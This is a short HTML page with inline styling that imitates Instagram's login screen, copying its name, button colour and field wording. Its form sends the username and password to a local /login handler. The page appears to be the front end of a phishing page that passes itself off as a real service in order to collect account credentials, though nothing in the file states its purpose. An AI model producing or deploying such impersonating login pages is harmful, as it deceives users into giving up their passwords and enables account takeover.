<!DOCTYPE html>
<html>
<head>
  <title>Instagram Login</title>
  <style>
    body {
      font-family: sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border: 1px solid #ccc;
      padding: 20px;
      text-align: center;
      width: 300px;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
    }
    button {
      padding: 10px;
      width: 95%;
      background-color: #3897f0;
      color: white;
      border: none;
    }
  </style>
</head>
<body>
  <form class="login-box" action="/login" method="POST">
    <h2>Instagram</h2>
    <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>
